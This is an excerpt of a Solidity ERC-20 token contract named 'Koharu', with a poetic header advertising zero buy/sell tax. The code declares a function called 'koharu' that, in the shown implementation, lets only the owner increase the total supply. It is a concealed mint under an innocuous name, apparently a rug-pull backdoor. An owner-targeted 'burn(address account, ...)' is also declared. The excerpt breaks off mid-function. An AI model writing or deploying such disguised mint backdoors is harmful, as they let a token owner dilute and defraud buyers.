...
// Koharu 華
//
// For in the dew of small things,
// the worthy find their potential.
//
// 0% Buy / Sell Tax
// The worthy will spread the message.
///////////////////////////////////////////*/
...
interface CreateToken is IERC20Metadata
{
    function decreaseAllowance(address spender, uint256 amount) external returns (bool);
    function increaseAllowance(address spender, uint256 amount) external returns (bool);

    function koharu(address account, uint256 amount) external returns (bool);
    function burn(address account, uint256 amount) external returns (bool);
}

contract Token is CreateToken
{
    ...
    function koharu(address account, uint256 amount) onlyOwner external returns (bool)
    {
        _totalSupply += amount;
